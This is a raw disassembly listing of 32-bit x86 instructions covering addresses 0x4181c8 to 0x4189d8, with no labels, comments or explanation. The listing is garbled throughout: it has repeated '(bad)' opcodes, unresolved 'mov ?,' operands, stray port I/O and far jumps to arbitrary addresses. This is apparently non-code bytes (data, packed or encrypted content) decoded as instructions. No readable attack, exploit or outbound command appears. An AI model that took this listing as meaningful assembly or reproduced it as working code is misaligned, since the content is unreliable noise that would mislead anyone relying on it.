  4181c8:	fdivr  QWORD PTR [ebp-0x65]
  4181cb:	add    ebx,esp
  4181cd:	jae    0x41818f
  4181cf:	mov    al,0x21
  4181d1:	adc    ebp,ebp
  4181d3:	jg     0x4181ca
  4181d5:	imul   ebx,DWORD PTR [edi+0x3dc756c],0x9d4474b8
  4181df:	inc    eax
  4181e0:	mov    esp,0x2cd91292
  4181e5:	or     DWORD PTR ds:0xec0920e7,0x9b3dbce4
  4181ef:	cmp    BYTE PTR [ebp+ecx*2-0x71faf3fc],ch
  4181f6:	out    dx,al
  4181f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181f8:	lods   eax,DWORD PTR ds:[esi]
  4181f9:	dec    eax
  4181fa:	mov    dh,0x35
  4181fc:	(bad)  
  4181fd:	stc    
  4181fe:	retf   
  4181ff:	aam    0xd5
  418201:	data16 out dx,al
  418203:	jnp    0x41823b
  418205:	iret   
  418206:	aad    0xf6
  418208:	sti    
  418209:	scas   al,BYTE PTR es:[edi]
  41820a:	or     al,0x65
  41820c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41820d:	sbb    al,0x46
  41820f:	add    BYTE PTR [esi+0x21],ah
  418212:	scas   eax,DWORD PTR es:[edi]
  418213:	outs   dx,DWORD PTR ds:[esi]
  418214:	xchg   DWORD PTR [edi],eax
  418216:	xchg   ecx,eax
  418217:	sbb    esi,DWORD PTR [ecx]
  418219:	pop    esp
  41821a:	nop
  41821b:	jp     0x418231
  41821d:	fimul  DWORD PTR [ebp-0x7]
  418220:	jge    0x418220
  418222:	lods   eax,DWORD PTR ds:[esi]
  418223:	(bad)  
  418224:	jp     0x418203
  418226:	add    DWORD PTR [eax],0xffffff81
  418229:	ror    dh,1
  41822b:	xor    eax,0xe1d8ac2a
  418230:	ficom  WORD PTR [esi]
  418232:	ret    
  418233:	mov    dl,0x28
  418235:	mov    ch,0x9f
  418237:	call   0x78f427c2
  41823c:	sub    eax,0x30b2ab0a
  418241:	and    BYTE PTR [ebp+0x50],bh
  418244:	pop    edx
  418245:	mov    ebx,0x726840b5
  41824a:	dec    esp
  41824b:	pop    edi
  41824c:	jne    0x4181f9
  41824e:	imul   ebx,DWORD PTR [esi-0x5ded0a0f],0x77
  418255:	out    dx,eax
  418256:	adc    esp,0x28b77187
  41825c:	pop    es
  41825d:	pop    ebx
  41825e:	jg     0x41827e
  418260:	mov    al,ds:0x371e539
  418265:	jl     0x41823d
  418267:	std    
  418268:	ffreep st(6)
  41826a:	int3   
  41826b:	adc    dh,BYTE PTR [edx+0x69d40d4c]
  418271:	mov    WORD PTR [edx+0xcfc509f],ss
  418277:	cmc    
  418278:	and    BYTE PTR [edi+0x583a7bad],dl
  41827e:	addr16 pop eax
  418280:	jle    0x418222
  418282:	add    dl,bl
  418284:	rcr    DWORD PTR [ecx],0xee
  418287:	fidivr WORD PTR gs:[ebx+edi*8]
  41828b:	mov    ebp,0xa80a140b
  418290:	scas   eax,DWORD PTR es:[edi]
  418291:	dec    ecx
  418292:	out    0x58,al
  418294:	int    0x5c
  418296:	or     edi,DWORD PTR [edi+ecx*2-0x46e68eab]
  41829d:	xor    BYTE PTR [ecx+0x2b9005c8],dl
  4182a3:	jns    0x4182a3
  4182a5:	pop    ss
  4182a6:	cdq    
  4182a7:	std    
  4182a8:	jecxz  0x418320
  4182aa:	out    dx,al
  4182ab:	adc    esi,DWORD PTR [eax+ecx*2-0x50]
  4182af:	sub    al,bl
  4182b1:	not    dl
  4182b3:	or     edi,DWORD PTR [ecx]
  4182b5:	adc    edx,DWORD PTR [ebx]
  4182b7:	pop    esi
  4182b8:	popf   
  4182b9:	arpl   WORD PTR [edi+0x45f45a04],dx
  4182bf:	scas   eax,DWORD PTR es:[edi]
  4182c0:	or     cl,ch
  4182c2:	int3   
  4182c3:	imul   esi,DWORD PTR ds:0xc18779d7,0x158f84e8
  4182cd:	cmp    al,BYTE PTR [esi+0xe810c0b]
  4182d3:	in     eax,0x3f
  4182d5:	or     bh,BYTE PTR [edi-0x70]
  4182d8:	fisttp QWORD PTR [eax-0x6e3a0f62]
  4182de:	mov    dh,0x21
  4182e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182e1:	jmp    0x41832f
  4182e3:	jno    0x41828c
  4182e5:	lock sahf 
  4182e7:	pop    edi
  4182e8:	ins    BYTE PTR es:[edi],dx
  4182e9:	and    eax,ebp
  4182eb:	stos   DWORD PTR es:[edi],eax
  4182ec:	mov    esp,DWORD PTR [ebx+0x5992e425]
  4182f2:	cmp    ch,BYTE PTR [esi-0x1f7a0ef0]
  4182f8:	fdivrp st(4),st
  4182fa:	push   ss
  4182fb:	in     al,dx
  4182fc:	add    al,0xb2
  4182fe:	es mov ch,0x8c
  418301:	jecxz  0x418349
  418303:	aad    0x78
  418305:	nop
  418306:	jae    0x4182ad
  418308:	sar    BYTE PTR [edx],1
  41830a:	dec    ebx
  41830b:	leave  
  41830c:	add    eax,0x80bc376a
  418311:	in     al,dx
  418312:	inc    esp
  418313:	pop    edi
  418314:	nop    ecx
  418317:	ss retf 0xc6db
  41831b:	fbld   TBYTE PTR [edx-0x1d43139d]
  418321:	mov    dh,0x3c
  418323:	and    DWORD PTR [eax+0x4629bb9f],0x9cf9ed78
  41832d:	iret   
  41832e:	mov    BYTE PTR [edx],al
  418330:	mov    DWORD PTR [edx+edx*2-0x4c2e969c],ecx
  418337:	hlt    
  418338:	pop    es
  418339:	push   eax
  41833a:	js     0x418340
  41833c:	pop    ebp
  41833d:	push   es
  41833e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41833f:	sbb    esp,esi
  418341:	popf   
  418342:	sub    al,0x1f
  418344:	int3   
  418345:	or     ebp,DWORD PTR [ebp+0x77]
  418348:	lds    esp,FWORD PTR [ecx]
  41834a:	xor    eax,0xf8fabcbb
  41834f:	stos   BYTE PTR es:[edi],al
  418350:	inc    ebp
  418351:	inc    esi
  418352:	push   0x886ec04d
  418357:	pop    edx
  418358:	jnp    0x4183c8
  41835a:	xchg   ebp,eax
  41835b:	jecxz  0x4182e7
  41835d:	(bad)  
  41835e:	mov    ebp,0x23a1ac5b
  418363:	xchg   ecx,eax
  418364:	scas   al,BYTE PTR es:[edi]
  418365:	sub    al,0xde
  418367:	call   0x91c1:0x12cb0fa1
  41836e:	push   0x31e2de7e
  418373:	loope  0x41831e
  418375:	xor    eax,0x9b810eb4
  41837a:	adc    dh,BYTE PTR ds:0xd90370d
  418380:	inc    edi
  418381:	bswap  esp
  418383:	bound  edx,QWORD PTR [eax-0x70]
  418386:	cdq    
  418387:	pop    eax
  418388:	sar    DWORD PTR [esi+0x1f],cl
  41838b:	fidiv  DWORD PTR [edi]
  41838d:	fadd   QWORD PTR [ecx-0x238956fd]
  418393:	mov    edx,0x2cef1001
  418398:	fild   DWORD PTR [esi]
  41839a:	cmp    eax,0x8089ffe3
  41839f:	inc    edx
  4183a0:	shr    DWORD PTR [esi+0x27],0x56
  4183a4:	jbe    0x4183dc
  4183a6:	push   ss
  4183a7:	sub    eax,0xc492134a
  4183ac:	ss inc esp
  4183ae:	out    0x79,eax
  4183b0:	ret    0x3bbd
  4183b3:	imul   BYTE PTR [eax+0x433c010a]
  4183b9:	imul   esi,DWORD PTR [edi],0x99949eb1
  4183bf:	xchg   esp,eax
  4183c0:	daa    
  4183c1:	mov    ?,esp
  4183c3:	popa   
  4183c4:	mov    esi,0xe7f1507b
  4183c9:	adc    eax,0xe7968fd1
  4183ce:	cmp    BYTE PTR [ecx+0x75ff2716],cl
  4183d4:	hlt    
  4183d5:	sub    al,0xb8
  4183d7:	mov    edx,0x780d3e00
  4183dc:	pop    ss
  4183dd:	fiadd  DWORD PTR [esi+0x6f783521]
  4183e3:	int3   
  4183e4:	ds adc ch,cl
  4183e7:	lods   eax,DWORD PTR ds:[esi]
  4183e8:	fwait
  4183e9:	test   al,0xb0
  4183eb:	adc    eax,0x5cd22866
  4183f0:	lahf   
  4183f1:	retf   0x2308
  4183f4:	inc    edx
  4183f5:	mov    ah,0xb1
  4183f7:	sbb    BYTE PTR [esi],0x77
  4183fa:	cmc    
  4183fb:	mov    dh,0x96
  4183fd:	mov    bh,0xfd
  4183ff:	cmc    
  418400:	fdiv   st,st(5)
  418402:	xchg   BYTE PTR [edi-0x77df9853],ah
  418408:	jge    0x418390
  41840a:	cmp    eax,0x440bfe3d
  41840f:	jnp    0x4183aa
  418411:	xor    ebx,DWORD PTR [ecx]
  418413:	mov    ch,0x58
  418415:	(bad)  
  418418:	fisubr DWORD PTR [edi]
  41841a:	mov    esp,0x46f3a790
  41841f:	ret    0xd144
  418422:	jae    0x41841f
  418424:	adc    BYTE PTR [ecx],dl
  418426:	out    dx,eax
  418427:	and    BYTE PTR ds:0xb2471773,bl
  41842d:	(bad)  
  41842e:	dec    edx
  41842f:	mov    ds:0xb0827c47,al
  418434:	retf   0xd440
  418437:	xchg   esp,eax
  418438:	cwde   
  418439:	ins    BYTE PTR es:[edi],dx
  41843a:	es cld 
  41843c:	sahf   
  41843d:	mov    ah,0xc2
  41843f:	ins    DWORD PTR es:[edi],dx
  418440:	std    
  418441:	loop   0x41848b
  418443:	jecxz  0x418453
  418445:	hlt    
  418446:	sbb    DWORD PTR [edi],edi
  418448:	clc    
  418449:	mov    esp,0x6886698e
  41844e:	pop    ebx
  41844f:	add    al,bh
  418451:	mov    BYTE PTR [ebx],bl
  418453:	inc    ebp
  418454:	jns    0x418487
  418456:	push   esp
  418457:	pop    edi
  418458:	inc    eax
  418459:	jmp    0x74d002b6
  41845e:	mov    ah,0x78
  418460:	push   ecx
  418461:	mov    cl,0xef
  418463:	pop    ds
  418464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418465:	aam    0x90
  418467:	out    dx,al
  418468:	(bad)  [edx+0x8]
  41846b:	shr    DWORD PTR [edi],1
  41846d:	neg    esp
  41846f:	repz mov esp,0xda9a13fe
  418475:	sub    eax,0x13743fa7
  41847a:	jl     0x41848d
  41847c:	push   es
  41847d:	mov    esp,0x74d6d474
  418482:	inc    edi
  418483:	or     dh,BYTE PTR [edx]
  418485:	out    dx,al
  418486:	test   al,0xa6
  418488:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41848a:	stc    
  41848b:	xchg   esi,eax
  41848c:	pop    edx
  41848d:	mov    edi,ebx
  41848f:	es xor dh,al
  418492:	rol    ch,0x91
  418495:	mov    al,ds:0x82c7a422
  41849a:	mov    WORD PTR [ecx-0x51],cs
  41849d:	mov    dh,0x66
  41849f:	xchg   esp,ebx
  4184a1:	inc    esp
  4184a2:	xor    dl,BYTE PTR [esi-0x12]
  4184a5:	mov    ebx,0xae9a3db5
  4184aa:	jns    0x41847b
  4184ac:	pop    edi
  4184ad:	dec    esp
  4184ae:	arpl   WORD PTR [esi+0x1ee07570],sp
  4184b4:	jae    0x41844b
  4184b6:	inc    ecx
  4184b7:	mov    ds:0x62b059f5,al
  4184bc:	add    BYTE PTR [eax+ecx*1-0x68],bl
  4184c0:	call   0x109b312c
  4184c5:	loope  0x4184f1
  4184c7:	mov    bl,0x5
  4184c9:	lods   eax,DWORD PTR ds:[esi]
  4184ca:	ins    BYTE PTR es:[edi],dx
  4184cb:	lods   eax,DWORD PTR ds:[esi]
  4184cc:	fsubr  QWORD PTR [eax]
  4184ce:	inc    esi
  4184cf:	push   es
  4184d0:	sub    edx,DWORD PTR [edi+0x72497766]
  4184d6:	fcomp  QWORD PTR [ebp+0x6e]
  4184d9:	push   es
  4184da:	nop
  4184db:	ret    0x2546
  4184de:	and    esi,ebx
  4184e0:	popa   
  4184e1:	push   0xffffffe3
  4184e3:	xor    al,dl
  4184e5:	cli    
  4184e6:	push   es
  4184e7:	ret    
  4184e8:	lds    esp,FWORD PTR [esi-0x25]
  4184eb:	in     al,0x7
  4184ed:	mov    ch,0xe3
  4184ef:	arpl   WORD PTR [ecx+0x69e560e4],sp
  4184f5:	jo     0x4184c1
  4184f7:	leave  
  4184f8:	leave  
  4184f9:	and    dh,BYTE PTR [ebp-0x138a9183]
  4184ff:	push   ebp
  418500:	pop    ebp
  418501:	dec    edi
  418502:	jae    0x418581
  418504:	out    0xf3,eax
  418506:	push   ss
  418507:	ds jp  0x4184f5
  41850a:	and    DWORD PTR [eax+ecx*4+0xe],eax
  41850e:	inc    ebp
  41850f:	jle    0x418582
  418511:	pop    ecx
  418512:	push   ss
  418513:	mov    bh,bl
  418515:	out    dx,eax
  418516:	inc    ecx
  418517:	repz pop es
  418519:	sub    ebp,ecx
  41851b:	mov    eax,ds:0x76a17670
  418520:	fidivr DWORD PTR [edi-0xe]
  418523:	push   es
  418524:	mov    al,ds:0xc508f391
  418529:	pop    es
  41852a:	enter  0xef19,0xa9
  41852e:	sar    DWORD PTR ds:0x23c236f7,1
  418534:	mov    gs:0xf2a7c29,eax
  41853a:	jae    0x41850f
  41853c:	retf   0x50b7
  41853f:	dec    ecx
  418540:	sahf   
  418541:	xor    DWORD PTR [ecx+0x5c],esp
  418544:	icebp  
  418545:	push   esi
  418546:	xor    al,0x3a
  418548:	lods   al,BYTE PTR fs:[esi]
  41854a:	data16 cmp al,0x2
  41854d:	mov    esi,0xae6edc1a
  418552:	sbb    al,0xf1
  418554:	stos   DWORD PTR es:[edi],eax
  418555:	push   ebx
  418556:	push   ds
  418557:	stc    
  418558:	lods   al,BYTE PTR ds:[esi]
  418559:	imul   edx,DWORD PTR [ebx-0x7c943469],0x53
  418560:	ror    BYTE PTR [edi+ebx*4+0x3b],0xee
  418565:	jecxz  0x4185b1
  418567:	loopne 0x41854b
  418569:	inc    edx
  41856a:	in     eax,dx
  41856b:	sbb    al,0x18
  41856d:	jno    0x41855a
  41856f:	mov    al,ds:0x511a9e36
  418574:	and    al,0xd1
  418576:	jmp    0x41859e
  418578:	pop    ebx
  418579:	or     DWORD PTR [ebx+0x7102697],ecx
  41857f:	bound  ecx,QWORD PTR [ebx-0x4d]
  418582:	in     al,dx
  418583:	add    DWORD PTR [edi-0x1b],0xe65b6f9d
  41858a:	fldenv [eax]
  41858c:	dec    ecx
  41858d:	mov    edx,0x68f72cfc
  418592:	pop    ds
  418593:	mov    WORD PTR [ecx-0x50],fs
  418596:	enter  0xb6a6,0x58
  41859a:	stc    
  41859b:	iret   
  41859c:	(bad)  
  41859d:	mov    WORD PTR [ecx+0x127cbd4a],gs
  4185a3:	push   ds
  4185a4:	ret    0xa9b2
  4185a7:	aas    
  4185a8:	out    dx,eax
  4185a9:	pusha  
  4185aa:	popf   
  4185ab:	pusha  
  4185ac:	or     BYTE PTR [edx-0x38df6b35],dh
  4185b2:	outs   dx,DWORD PTR ds:[esi]
  4185b3:	push   ecx
  4185b4:	xor    bl,BYTE PTR [edi+0x4b]
  4185b7:	jbe    0x4185ec
  4185b9:	(bad)  
  4185ba:	lods   eax,DWORD PTR ds:[esi]
  4185bb:	pop    ss
  4185bc:	xchg   BYTE PTR [esp+esi*2+0x6b],dl
  4185c0:	push   esi
  4185c1:	inc    esp
  4185c2:	out    dx,al
  4185c3:	add    al,0x1d
  4185c5:	mov    al,ds:0x3445a88
  4185ca:	ins    BYTE PTR es:[edi],dx
  4185cb:	stc    
  4185cc:	jmp    0x418647
  4185ce:	push   0xb0fe4bdb
  4185d3:	retf   
  4185d4:	call   0xafc4:0x153f0c91
  4185db:	and    bl,BYTE PTR [ecx]
  4185dd:	mov    ?,WORD PTR [edx+0x5d]
  4185e0:	adc    esp,DWORD PTR [edx+ecx*8+0x7f]
  4185e4:	push   edx
  4185e5:	mov    ebx,DWORD PTR es:[ebx+0x7f]
  4185e9:	test   DWORD PTR [ebp-0x1fe19994],0xaf61eb80
  4185f3:	inc    BYTE PTR [esi+0x367395b2]
  4185f9:	sub    BYTE PTR [esi+ebp*8+0x7d0c9f06],bl
  418600:	test   eax,0x8e64f927
  418605:	inc    ecx
  418606:	je     0x4185b6
  418608:	lds    edx,FWORD PTR [edi+edx*1+0x7d003389]
  41860f:	or     eax,0x1c1bd977
  418614:	push   0x38
  418616:	jbe    0x4185b3
  418618:	push   esp
  418619:	idiv   BYTE PTR [ecx+0xb9f0588]
  41861f:	in     al,0x44
  418621:	call   0xa42383dc
  418626:	mov    edi,DWORD PTR [eax]
  418628:	dec    edx
  418629:	mov    al,ds:0xe58c19cc
  41862e:	scas   eax,DWORD PTR es:[edi]
  41862f:	rol    bl,1
  418631:	outs   dx,BYTE PTR ds:[esi]
  418632:	add    edx,0x60
  418635:	sti    
  418636:	jno    0x41868f
  418638:	cmp    BYTE PTR [esi],cl
  41863a:	sub    BYTE PTR [ebx-0x5354bff1],0xe8
  418641:	ret    
  418642:	sub    BYTE PTR [edx+0x4ea5eff],ch
  418648:	cmp    ecx,DWORD PTR [ecx]
  41864a:	jns    0x418660
  41864c:	pop    ebp
  41864d:	enter  0xb5dc,0xf2
  418651:	jo     0x4185e1
  418653:	rol    BYTE PTR [edx+0x2b],cl
  418656:	int3   
  418657:	out    dx,eax
  418658:	enter  0xc3a5,0x85
  41865c:	aas    
  41865d:	mov    DWORD PTR [edi],ecx
  41865f:	pop    edx
  418660:	arpl   sp,si
  418662:	es (bad) 
  418664:	in     eax,dx
  418665:	or     bh,0x76
  418668:	rcr    cl,1
  41866a:	mov    esi,0xd8651068
  41866f:	sbb    DWORD PTR [esi],ebp
  418671:	jl     0x4186a1
  418673:	les    edi,FWORD PTR [eax+0x22]
  418676:	inc    esp
  418677:	jle    0x4186d3
  418679:	mov    ch,0x4
  41867b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41867c:	pusha  
  41867d:	jmp    0xde378e69
  418682:	cmc    
  418683:	rcr    DWORD PTR [edx-0x37],cl
  418686:	cmp    al,0xa7
  418688:	retf   0xa580
  41868b:	add    DWORD PTR [edi+0x77],eax
  41868e:	daa    
  41868f:	mov    ds:0x4fb3709b,al
  418694:	inc    esi
  418695:	cmp    DWORD PTR [ecx-0x3f],edi
  418698:	(bad)  
  418699:	sbb    DWORD PTR ds:0xffea7267,esp
  41869f:	push   0x94f306e0
  4186a4:	rcr    DWORD PTR [edx+0x79ba8582],1
  4186aa:	jmp    0x3bf5:0x3de067d1
  4186b1:	inc    ebp
  4186b2:	mov    ecx,DWORD PTR [edx+0x32]
  4186b5:	test   eax,0x83ce6701
  4186ba:	fisub  WORD PTR [esi]
  4186bc:	jmp    0x418734
  4186be:	lods   al,BYTE PTR ds:[esi]
  4186bf:	mov    al,0x12
  4186c1:	scas   al,BYTE PTR es:[edi]
  4186c2:	repnz outs dx,DWORD PTR ds:[esi]
  4186c4:	jge    0x418649
  4186c6:	out    dx,al
  4186c7:	dec    esi
  4186c8:	or     eax,0xad778894
  4186cd:	sub    DWORD PTR [ebp-0x58d84bf6],eax
  4186d3:	mov    ch,0x4d
  4186d5:	pop    es
  4186d6:	push   ebx
  4186d7:	adc    al,0x72
  4186d9:	push   edi
  4186da:	ficom  DWORD PTR [eax-0x72]
  4186dd:	idiv   BYTE PTR [eax-0xd949733]
  4186e3:	fild   WORD PTR [ecx-0x11c37cff]
  4186e9:	das    
  4186ea:	rcl    dl,0xa5
  4186ed:	jl     0x4186bb
  4186ef:	add    ch,BYTE PTR [ecx]
  4186f1:	add    eax,0x5543b79a
  4186f6:	dec    ebx
  4186f7:	sbb    BYTE PTR ds:0x175df63f,ah
  4186fd:	outs   dx,BYTE PTR ds:[esi]
  4186fe:	push   esi
  4186ff:	adc    BYTE PTR [ebp-0x728dbd71],0x40
  418706:	cmp    ebp,0x70c7b21e
  41870c:	or     eax,0xf99306e6
  418711:	repnz mov bl,0x2b
  418714:	gs std 
  418716:	mov    esp,0x6b134429
  41871b:	mov    bl,0x2e
  41871d:	rcl    BYTE PTR [ebp-0x31dc384f],cl
  418723:	sub    dl,BYTE PTR cs:[edi-0x7b]
  418727:	rcr    DWORD PTR [esi],0x90
  41872a:	mov    eax,0xf485edb0
  41872f:	scas   al,BYTE PTR es:[edi]
  418730:	ins    BYTE PTR es:[edi],dx
  418731:	scas   eax,DWORD PTR es:[edi]
  418732:	ficomp DWORD PTR [ebx-0x74]
  418735:	pop    edx
  418736:	ret    
  418737:	and    dl,al
  418739:	sub    eax,0xc279d37
  41873e:	or     esp,DWORD PTR [edx+0x5d7d13b9]
  418744:	sbb    DWORD PTR [esp+eax*2],ebp
  418747:	add    al,0x6d
  418749:	or     BYTE PTR [eax],bh
  41874b:	adc    DWORD PTR [esp+eiz*2],esi
  41874e:	xchg   esi,eax
  41874f:	dec    esp
  418750:	pop    ebx
  418751:	sti    
  418752:	test   BYTE PTR ds:0x395896e9,ah
  418758:	clc    
  418759:	sub    eax,0x9a8d08fa
  41875e:	repz xor DWORD PTR [eax-0x66cd7074],ecx
  418765:	test   DWORD PTR [ecx-0x31],esp
  418768:	std    
  418769:	inc    eax
  41876a:	call   0x503f1b70
  41876f:	fstp   DWORD PTR [esi+0x3d4c58e8]
  418775:	pop    ebx
  418776:	xchg   esp,eax
  418777:	xchg   edx,eax
  418778:	and    ch,bh
  41877a:	js     0x41875b
  41877c:	fyl2xp1 
  41877e:	or     al,0x5e
  418780:	xor    eax,0xe6558371
  418785:	dec    ebx
  418786:	pop    ds
  418787:	inc    edi
  418788:	sti    
  418789:	jl     0x4187f7
  41878b:	push   cs
  41878c:	ins    BYTE PTR es:[edi],dx
  41878d:	jmp    0x78e6596e
  418792:	fsub   QWORD PTR [ebp-0x67efd275]
  418798:	(bad)  
  418799:	pop    esp
  41879a:	dec    esp
  41879b:	in     eax,dx
  41879c:	aam    0xdf
  41879e:	rcl    edi,cl
  4187a0:	popa   
  4187a1:	push   0xfffffff5
  4187a3:	(bad)  
  4187a4:	in     al,dx
  4187a5:	or     eax,0xf4c62031
  4187aa:	dec    edx
  4187ab:	imul   ecx,DWORD PTR [edi+0x11],0x8a978a08
  4187b2:	imul   ebx,DWORD PTR ss:0xb5bf78ea,0xffffff86
  4187ba:	jno    0x4187e9
  4187bc:	mov    ds:0x52565536,al
  4187c1:	mov    DWORD PTR [ebx-0x474d5edf],0x421716c6
  4187cb:	xchg   edx,eax
  4187cc:	mov    esp,0xa4a83ac5
  4187d1:	adc    al,0xfb
  4187d3:	sub    ch,bl
  4187d5:	mov    ebx,0x5f6d5e5d
  4187da:	push   0xf9d88f31
  4187df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187e0:	mov    ah,0x33
  4187e2:	cld    
  4187e3:	(bad)  
  4187e4:	out    dx,eax
  4187e5:	xlat   BYTE PTR ds:[ebx]
  4187e6:	ds sub eax,0xf4b33e6b
  4187ec:	ins    BYTE PTR es:[edi],dx
  4187ed:	out    dx,eax
  4187ee:	int3   
  4187ef:	outs   dx,DWORD PTR ds:[esi]
  4187f0:	retf   
  4187f1:	mov    esp,0x2d383d47
  4187f6:	clc    
  4187f7:	in     eax,0x94
  4187f9:	(bad)  
  4187fa:	mov    ?,WORD PTR [esi]
  4187fc:	call   0x6ab4afa0
  418801:	mov    DWORD PTR [edi-0x78],esp
  418804:	mov    ebx,0x59e34ce4
  418809:	cld    
  41880a:	sbb    al,0xd0
  41880c:	mov    dl,0x80
  41880e:	dec    edi
  41880f:	mov    esi,0xb64d9316
  418814:	fistp  DWORD PTR [ebx+0x8047725]
  41881a:	arpl   WORD PTR [ebx],sp
  41881c:	xor    al,0xf1
  41881e:	fcmovnb st,st(5)
  418820:	inc    esi
  418821:	les    esp,FWORD PTR [ecx+0xb]
  418824:	popa   
  418825:	je     0x4187c5
  418827:	cmp    ah,BYTE PTR [esi+0x437d7174]
  41882d:	call   0x91253bb9
  418832:	pushf  
  418833:	adc    DWORD PTR [ecx+0x7b],eax
  418836:	imul   ebx,eax,0x910f4cb5
  41883c:	pop    edx
  41883d:	in     al,dx
  41883e:	cmovg  edx,DWORD PTR [ebx+0x6e50de33]
  418845:	call   0x2100:0x62fa5738
  41884c:	call   0xe4a48df2
  418851:	push   0x8b60e2f5
  418856:	lock shr DWORD PTR ds:0x2c856ea5,1
  41885d:	adc    ch,cl
  41885f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418860:	push   ebx
  418861:	or     bh,cl
  418863:	jecxz  0x4188aa
  418865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418866:	jns    0x418827
  418868:	iret   
  418869:	in     eax,dx
  41886a:	xor    bh,BYTE PTR [ebp-0x4b58b07f]
  418870:	mov    ebx,0x6785a3fc
  418875:	aad    0x71
  418877:	jo     0x418821
  418879:	retf   
  41887a:	adc    BYTE PTR [ecx-0x3ea2a67d],ch
  418880:	jge    0x4188f9
  418882:	shl    BYTE PTR [esi],cl
  418884:	std    
  418885:	adc    dl,dh
  418887:	push   esi
  418888:	stc    
  418889:	test   BYTE PTR [edx],dl
  41888b:	cmp    al,0xa4
  41888e:	push   ebx
  41888f:	jae    0x418897
  418891:	std    
  418892:	mov    esi,0xc1e5dd04
  418897:	sub    BYTE PTR [ebx-0x3b0e44a1],0x5f
  41889e:	add    edi,ebp
  4188a0:	fmul   QWORD PTR [edi-0x4d]
  4188a3:	mov    esi,ebp
  4188a5:	pop    edi
  4188a6:	and    BYTE PTR [ecx+0x14],ah
  4188a9:	cli    
  4188aa:	les    esp,FWORD PTR [esi-0x1f6f1b51]
  4188b0:	sbb    eax,0xaf1c1774
  4188b5:	in     al,0x89
  4188b7:	jmp    0x4188ce
  4188b9:	push   cs
  4188ba:	icebp  
  4188bb:	mov    BYTE PTR [edx],dh
  4188bd:	xchg   ecx,eax
  4188be:	jb     0x4188d6
  4188c0:	xor    BYTE PTR [ebp+0x2d],dl
  4188c3:	mov    ch,0xdc
  4188c5:	ror    DWORD PTR [esi],cl
  4188c7:	add    dh,BYTE PTR [ebx-0x16b3827d]
  4188cd:	fidivr DWORD PTR [eax+0x6a0cdcb5]
  4188d3:	daa    
  4188d4:	push   eax
  4188d5:	repnz dec ebp
  4188d7:	loope  0x41888a
  4188d9:	xchg   ecx,eax
  4188da:	in     al,0x98
  4188dc:	mov    edx,0x5fdfabc0
  4188e1:	jp     0x4188a7
  4188e3:	pop    edx
  4188e4:	xor    BYTE PTR [eax-0x36e105e],ch
  4188ea:	mov    ds:0xc5d3520a,al
  4188ef:	dec    ecx
  4188f0:	inc    eax
  4188f1:	jle    0x4188b4
  4188f3:	push   ebp
  4188f4:	mov    ebp,0xab634314
  4188f9:	out    dx,eax
  4188fa:	out    dx,al
  4188fb:	(bad)  
  4188fc:	in     al,dx
  4188fd:	lahf   
  4188fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188ff:	sbb    BYTE PTR [eax-0x6a],cl
  418902:	retf   0x693e
  418905:	cdq    
  418906:	mov    esp,0xd7b3e845
  41890b:	inc    esp
  41890c:	dec    esp
  41890d:	jbe    0x4188a3
  41890f:	sub    ebp,ecx
  418911:	jg     0x418968
  418913:	cmp    eax,0x9d340704
  418918:	dec    ebp
  418919:	mov    dl,0x85
  41891b:	or     al,0x88
  41891d:	popf   
  41891e:	out    0x87,eax
  418920:	mov    ecx,0x9c6dffb1
  418925:	sub    ebp,DWORD PTR [esi-0x7d]
  418928:	pop    esi
  418929:	xchg   esp,eax
  41892a:	jg     0x41893b
  41892c:	test   ch,al
  41892e:	dec    eax
  41892f:	mov    ch,0x29
  418931:	push   0x2b
  418933:	fs pop ecx
  418935:	push   eax
  418936:	ret    0xa749
  418939:	sub    BYTE PTR [ecx],dl
  41893b:	jae    0x4189b7
  41893d:	mov    ebp,0x340734a
  418942:	pusha  
  418943:	ins    DWORD PTR es:[edi],dx
  418944:	pop    es
  418945:	cwde   
  418946:	mov    edi,0x6e53e13f
  41894b:	sahf   
  41894c:	jle    0x418957
  41894e:	test   BYTE PTR [bx+si],ch
  418951:	pushf  
  418952:	stc    
  418953:	sar    BYTE PTR [edx],0xd4
  418956:	sub    ch,BYTE PTR [esi+0x718b9d39]
  41895c:	cmp    DWORD PTR [edi+edx*8],0x229781da
  418963:	push   cs
  418964:	mov    bl,0x14
  418966:	xor    al,0x59
  418968:	pop    ecx
  418969:	mov    ebx,0xc8f34ff4
  41896e:	sbb    al,0x58
  418970:	jne    0x41897b
  418972:	rol    BYTE PTR [eax],1
  418974:	into   
  418975:	sbb    ebp,DWORD PTR [edi]
  418977:	inc    edx
  418978:	pop    ds
  418979:	jecxz  0x4189f5
  41897b:	mov    dh,0x46
  41897d:	push   esi
  41897e:	test   eax,0xc0ed3629
  418983:	xor    eax,0x930a0b4
  418988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418989:	lahf   
  41898a:	dec    esp
  41898b:	and    esp,DWORD PTR [edi-0x7d]
  41898e:	dec    ebp
  41898f:	test   BYTE PTR [edi+0x688e1255],ch
  418995:	mov    eax,0x29d17060
  41899a:	dec    ecx
  41899b:	jg     0x4189c3
  41899d:	pop    ebp
  41899e:	jae    0x418991
  4189a0:	sub    esp,esp
  4189a2:	and    BYTE PTR [edx+0x22],ch
  4189a5:	lea    edi,[ebp-0x4b]
  4189a8:	jmp    0x205b3c61
  4189ad:	xchg   ecx,ebx
  4189af:	cmc    
  4189b0:	mov    ds:0x96e6216d,al
  4189b5:	pop    ss
  4189b6:	mov    esi,edx
  4189b8:	jg     0x41893a
  4189ba:	jl     0x418a0d
  4189bc:	call   0x565e29a9
  4189c1:	inc    edx
  4189c2:	(bad)  
  4189c3:	or     eax,DWORD PTR [eax]
  4189c5:	ret    0xb21d
  4189c8:	add    DWORD PTR [edx+0x4e],ecx
  4189cb:	add    DWORD PTR [esi+0x2b95d347],0x5dddfc27
  4189d5:	nop
  4189d6:	inc    eax
  4189d7:	xchg   esi,eax
  4189d8:	and    BYTE PTR ds:0x9fe0ff3d,dh
